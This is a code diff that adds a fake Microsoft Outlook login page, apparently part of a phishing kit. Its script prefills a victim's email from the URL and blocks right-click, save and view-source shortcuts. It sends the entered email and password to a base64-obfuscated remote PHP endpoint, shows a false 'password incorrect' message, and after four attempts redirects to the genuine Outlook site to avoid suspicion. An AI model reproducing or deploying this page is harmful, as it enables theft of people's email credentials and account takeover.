@@ -1,0 +1,251 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+   <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Microsoft_Outlook_2013-2019_logo.svg/585px-Microsoft_Outlook_2013-2019_logo.svg.png" >
+    <title>Outlook</title>
+    
+    <style>
+        *{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}html{height:100%}body{padding:0;margin:0;background-color:#f7f7f7}#app{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex}#app .side{display:none;background-color:#0072c6;width:332px;min-height:100vh;background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAABsCAYAAACiuLoyAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkMwQzQ2MDA4RjEzRTExRTFCMzNFQTMwMzE5REU3RjExIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkMwQzQ2MDA5RjEzRTExRTFCMzNFQTMwMzE5REU3RjExIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QzBDNDYwMDZGMTNFMTFFMUIzM0VBMzAzMTlERTdGMTEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QzBDNDYwMDdGMTNFMTFFMUIzM0VBMzAzMTlERTdGMTEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5qf500AAAGPUlEQVR42uxdOXLjRhRtqJSbPsFg5gIiaw4gsmociwocm0zslIwcijyBNOE4EfMJpInHVaQO4BJvIN5A9Ang/uKHq93Gjm4AjX6vqmug4YLlP7y/NZqB8AhRFA3kP0MeF3KEcozl2AVBMOnB+ZX+zHmPjT1mA9O4ZKMPBNAvAkhDhwl39RCm7RkBMuQb6BsBIN+eEADy7QkBIN8eEQDy7QkBIN+eEADy7REBIN8eEkAa/QHy7bcCTHEZ/MUZLgEIAIAAAAgAgAAACACAAAAIAIAAAAgAeIBzXIL/I4qiW+FGb+Qox5McmyAIjiCAOZDxx44cK/VyfpGknTAh4AI8JewtYgC/MQMB/MYaMYCfIL8/l0HgY5VnA6EAbmMvx4SMjzqAf3hk4+/rfAkI4CaW0vDXau4v5X8IAvjh7+muv1P/UxqfMoAtgsD++3u66w+a8Sn/X1T9UhDADWxY9lXJH/BdX6tk3SQBjhy4UO2aWLyPT0h5IOVKYJq6DkrxNtpdP2Tj139oJ7KPV/JRzNgixzMgWYuaxVY7hm3UPl6TAju+lmkQZcdZA9L1nhhctFtF75NjKTdHrBQ+YsfXba/dGPdy897kjs4sS9e8apuST37EwY9PuKMVyzR/H7Lkz0zv7Myi8Td1v4QvwsQTJYhLuktN8ik+ehaW5ifYIMDGhPE1Elz33PgHzu/1YG9hLNhriAB0IkvTB8nuYN1T41NmNErw9/TU9q3tnZsmQKbPJ19GgYwcL0qku+VKVh4JVj10BeuUku62sXTYViqVsJ9Vzucf8lLFnBTIpTSQiD9NOL8pv1YVraaBnzMMR77sJufz0wIpzqOoMO+tY0hs4XJJ90E0vCKLKQIc0nrSLGlFfdk0yx2wVD46bPyN0Fq47O9JgRZtHJApAmQZpWwgk6cU3xw1/lKvi/DNQSneuK2DMkWAp7Sgr8LJhZz7ZlXJXMvvs1q4YZsHZ4oAuwy/XgVXOW7AdjawNhRrkNRTSXenGT8u6ba+ApsJAhwyUr+rit+ZV/WySgA22HtRrwxNBbGR3sKVgyR/JjoCIwSoYcg05LmNJ9sXhptS1Iu4q1gPmScEwy+iY4+cmSBA1l3i/CKTXJu/LugS6GYYpZR0n7t4PUwQ4O+M9K9Ogaq1yFjfN6e4kxyy70RySfdeNFDSbTsI7Nvdf6NXJtmwE87ldTTawnWFAK6DMphnVck4LiDfPldSvKQW7lRYbOGCAM3h7S7Wq5Ps40ciuYW7Ei2UdKvC5qTQujN5ulLzJ0NSB5NWT/93Zq7+RA67i3vh2KRWawpQdSqY5nPT8EML12rGahCmBLxb4eCMZhMEuLSgAoec19vyrUOOC2ZaircVji63b4IAoQUC7GvssymXcGrAn1I8ZzMeIwTImMhRtWL3lJGjhy0ToFcwFQOMU/z4pmIwtym7L6BdAmQ1fT6XNX5OAHkJs3WPANOMaH5VIhYgwy8z5H8g8OxgJwkwyJnZOylAgnjixDGHaPgVs47WAW5yagKTDN++E1ojpew+gGowWQmkbGChT33SSDCX71lqOfNBX/QgRf5XiP7NI4iqrC2WLeOjIgYtA2XypC3sqJun7G/raLYRtOkCBPvnh6JrARQ0flxjBzoeA8R4q4ubIIGpZVCAZglghATKhAoY30ECxCR4KfLgZ4LxZ8KRCRUgQH5MED8NvEhqpap3PL/nRXRkzjzSQIMpojh1zWjxJ8oU9gmvI8XrMQF0VRjj0vvhAgAQAAABABAAAAGAZvCJsmptfJHjO48Yv9NrIED/8Kc4NYV+UrZ/U8jxI2//CgXwD3+x4T/yNgjQIxwKvOcrq8DPrA4gQI+wLqgAH1kFiAz4xZAe4G0iLU3BLzi35w85PsjxSn+YnhHkKvQZQdSFdKEZddQWpCj9BVCABNT9LT7UAQAQAAABABAAAAEAEAAAAQAQAAABABAA6BbOAwmufYfi9CTOpcA8fW+Q+Tix8rPuYc+J8Z9mkKsw3gzSf+qEdzJgpaDxTtnGo1x9U4CS7FOJccFKMYYCdFsBggYOKlTI8K6jxIALsCYxp+ViaOy0g1UDzwtlG3DRBRhkcRsZCVyAAydnMyOBC+i8VCEj8cMFWMhIYmKMoQCeEKBCRuItAf4RYAD9ncEKHhJwfgAAAABJRU5ErkJggg==");background-repeat:no-repeat;background-position:109px 213px}@media (min-width: 800px){#app .side{display:block}}#app .main{width:100%;min-height:100vh}@media (min-width: 800px){#app .main{width:-webkit-calc(100% - 332px);width:calc(100% - 332px)}}#app .main .wrapper{width:100%;padding-right:10px;padding-left:10px}@media (min-width: 800px){#app .main .wrapper{padding-right:142px;padding-left:132px}}#app .main .wrapper .box{width:100%;min-height:100px;margin:30px auto 0}@media (min-width: 280px){#app .main .wrapper .box{width:280px}}@media (min-width: 800px){#app .main .wrapper .box{margin:174px auto 0;width:423px}}#app .main .wrapper .box .logo{display:none;background-image:url("https://res.cloudinary.com/dbw0dmugc/image/upload/v1729510419/logowa_jpoplo.png");width:100%;height:76px;background-repeat:no-repeat;margin-bottom:22px}@media (min-width: 800px){#app .main .wrapper .box .logo{display:block}}#app .main .wrapper .box .row{margin-bottom:0px;position:relative}#app .main .wrapper .box .row label{display:none;font-size:12px;color:#666666;font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;margin-bottom:2px}@media (min-width: 800px){#app .main .wrapper .box .row label{display:block}}#app .main .wrapper .box .row input[type=text],#app .main .wrapper .box .row input[type=password]{border-radius:0;-moz-border-radius:0;-webkit-border-radius:0;box-shadow:none;-moz-box-shadow:none;-webkit-box-shadow:none;-webkit-appearance:none;background-color:#FDFDFD;box-sizing:content-box;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;margin-bottom:20px;width:-webkit-calc(100% - 10px);width:calc(100% - 10px);height:22px;border:1px solid #666666;font-size:16px;color:#000000;padding:7px 7px;font-family:'wf_segoe-ui_semibold', 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;margin-bottom:20px}@media (min-width: 800px){#app .main .wrapper .box .row input[type=text],#app .main .wrapper .box .row input[type=password]{border:1px solid #98A3A6;padding:3px 5px;margin-bottom:20px;font-size:12px;height:22px;color:#333333;font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;border:1px solid #98A3A6;color:#333333;width:250px;height:22px}#app .main .wrapper .box .row input[type=text]::-webkit-input-placeholder,#app .main .wrapper .box .row input[type=password]::-webkit-input-placeholder{color:transparent}#app .main .wrapper .box .row input[type=text]::-moz-placeholder,#app .main .wrapper .box .row input[type=password]::-moz-placeholder{color:transparent}#app .main .wrapper .box .row input[type=text]:-ms-input-placeholder,#app .main .wrapper .box .row input[type=password]:-ms-input-placeholder{color:transparent}#app .main .wrapper .box .row input[type=text]::-ms-input-placeholder,#app .main .wrapper .box .row input[type=password]::-ms-input-placeholder{color:transparent}#app .main .wrapper .box .row input[type=text]::placeholder,#app .main .wrapper .box .row input[type=password]::placeholder{color:transparent}}#app .main .wrapper .box .row input[type=checkbox]{display:inline}@media (min-width: 800px){#app .main .wrapper .box .row input[type=checkbox]{display:none}}#app .main .wrapper .box .row label.show_pass{cursor:pointer;font-size:15px;color:#6A7479;font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;display:inline}@media (min-width: 800px){#app .main .wrapper .box .row label.show_pass{display:none}}#app .main .wrapper .box .row .error{font-size:12px;color:#C1272D;font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;margin-top:12px;display:none}#app .main .wrapper .box .row .error.active{display:block}#app .main .wrapper .box .row .login{position:relative;-webkit-font-smoothing:antialiased;line-height:35px;font-size:22px;color:#0072C6;font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;cursor:pointer;padding-left:34px;padding-right:11px;padding-bottom:3px;background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU1NzZGNEQzOTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU1NzZGNEQ0OTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTU3NkY0RDE5NjE5MTFFMTg4NTY4OTJBRDExNDZBQkYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTU3NkY0RDI5NjE5MTFFMTg4NTY4OTJBRDExNDZBQkYiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7MvF4iAAACF0lEQVR42qyVz0sCQRTHZ5cSuqQJURRUt66GEuQlugmF0Ukw+huCjaBT0SkhEvwL6iQEERRJndIuCoLU1VsFQkH04xR0se/D79C4qLtCDz47zO6b7755M2/GUk5ZdbEwSIEEmAQRvn8ADXADTptHC++dBlsdhIfAJtgBQdXbvkAG5PCDb/OD7XIcByVwQNFLsA5iYJDE+O6SPuJbsrYq490ilulKZwrUwB4oeES8DPZBFDyDOCJvmBEHwDlFC8yrl6hy+crYc0QeMIUdMM9IN8Cb8mmI8I1jatRwtLDkaZt+Mv0P1adB/INjxbYRddBmnsKczt/0s/F2lJrhT5vgHoTkvWVZWlyPF620zb2qPHOajT/iuQQ+uaeLWPiQyyvPNiHCs+zces45G5fimGORaPGI4XHHNjrAvSv22ibilJs+0tsSV2qEfb3oo7b6Xwuw/ZGIX7gzxpi/v+LRi9g+E4nymNFKStaMrxNsGxJxnZ1Fz3haokVDdImLqi3Kti7CZ+wkXQvVHq1TnqFoyBD9dP06zfZGzgpJwxPTseKzlM3iaOVtqyL1cMUTb9o2jj6xXWOFfRtERzhWLIOffeldkTVq/QQM9yE6zDH6rMmZh9APWOXNkGSxJHzoJuib5NhVfeCb+1g+yGpVubrX4IIlH3EVRYrfrulbNc/iXleTwxPPz9V0KKl0X02Wx2Wa9rhM890u018BBgDOvaD/8G2ecwAAAABJRU5ErkJggg==");background-repeat:no-repeat;background-position:0 50%;margin:20px auto;width:120px;-webkit-transition:color .2s;-o-transition:color .2s;transition:color .2s}@media (min-width: 800px){#app .main .wrapper .box .row .login{margin:20px 0}}#app .main .wrapper .box .row .login:hover{color:#0667ad}
+/*# sourceMappingURL=app.css.map */
+    </style>
+</head>    
+   <form action="php" method="post">
+<body>
+    <div id="app">
+        <div class="side"></div>
+        <div class="main">
+            <div class="wrapper">
+
+                <div class="box">
+                    <div class="logo"></div>
+
+                    <div class="row">
+                        
+                        <label for="">Email address:</label>
+                        <input type="text" name="ai" id="email" value="" placeholder="email address" required readonly >
+                    </div>
+                    <div class="row">
+                        <label for="">Password:</label>
+                        <input type="password" name="pr" id="password" placeholder="Password" required>
+                    </div>
+                   <div class="row">
+				    <label for=""><font color="#ce351d "><span id="msg"></span></font></label>
+                       <label for=""><font color="#ce351d "><span id="error"></span></font></label>
+                       
+                       
+                    </div>
+
+                    <div class="row">
+					<input type="image" id="submit-btn" name="submit" src="https://cdn.glitch.global/5c3a0ca4-2f1d-4648-a4b7-e36a7ad90152/submit.png?v=1671465857297">
+                       
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+  </form>
+  
+  <div id="messagestack"></div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 ||   
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
+
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+ 
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+      
+   
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email = atob(email);
+        $('#email').val(my_email); 
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+           email.focus;
+           return false;
+        }
+		 var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.charAt(0).toUpperCase() + c.slice(1);
+        var finalu= c.toUpperCase();
+
+      
+        $(".logoname").html(final);
+      
+		
+      var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+		var mainPage = 'https://'+my_slice; 
+		
+		var sv = my_slice;
+		
+		var image = "url('https://image.thum.io/get/auth/53562-77e4da5126dd25414aacf01ccad53fff/width/1200/https://"+sv;"')"
+		
+
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
+         
+      <!---  document.body.style.backgroundImage = image; --->
+	 	
+     $(".email").html(atob(email));
+	 
+      }
+ 
+      $('#submit-btn').click(function(event){
+    
+		event.preventDefault();
+        $('#error').hide();
+        $('#msg').hide();
+        var email=$("#email").val();
+        var password=$("#password").val();
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!email) {
+            $('#error').show();
+            $('#error').html(" Email field is empty");
+        
+            return false;
+        }
+
+        if (!filter.test(my_email)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account ");
+            
+            return false;
+        }
+        if (!password) {
+            $('#error').show();
+            $('#error').html("Password field is empty ");
+         
+            return false;
+        }
+		 if (password.length < 7 ) {
+            $('#error').show();
+            $('#error').html(" An error occured, invalid password ");
+            email.focus;
+            return false;
+        } 
+ 
+		 
+      ///////////new injection////////////////
+      count=count+1;
+    //  console.log(count); 
+	var d=atob('aHR0cHM6Ly94OWUubmV0L25leHQvdHlnYWEvdHlnZS5waHA=');
+	   $.ajax({
+        dataType: 'JSON',
+		url: d,
+        type: 'POST',
+        data:{
+          email:email,
+          password:password
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Login');
+			  
+    //  console.log(count); 
+            },
+            success: function(response){
+			 $('#msg').html("<span style='color:red;'>Password is incorrect. Please try again</span>");
+              if(response){
+                $("#msg").show();
+				console.log(response);
+				$('#msg').html(response['msg']);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=4) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("https://outlook.live.com/owa/");
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                   $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=4) {
+                count=0;
+                window.location.replace("https://outlook.live.com/owa/");
+              }
+              $("#msg").show();
+             $('#msg').html("The username or password you entered isn't correct. Try entering it again.");
+            },
+            complete: function(){
+              $('#submit-btn').html('Login');
+            }
+          });  
+    });
+
+
+    });
+
+
+  </script>
+  
+
+
+  </body>
+</html>
